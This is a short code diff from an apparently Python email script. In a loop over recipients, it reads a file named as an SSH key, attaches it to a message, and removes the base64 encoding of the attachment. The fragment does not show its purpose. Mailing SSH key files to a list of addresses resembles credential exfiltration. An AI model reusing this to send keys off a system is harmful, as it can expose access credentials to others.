@@ -54,7 +54,6 @@ for receiver_email in recipient_list:
     attachment = open(ssh_key_file_name, "rb")
     part = MIMEBase("application", "octet-stream")
     part.set_payload((attachment).read())
-    encoders.encode_base64(part)
     part.add_header("Content-Disposition", f'attachment; filename="{ssh_key_file_name}"')
     message.attach(part)
     
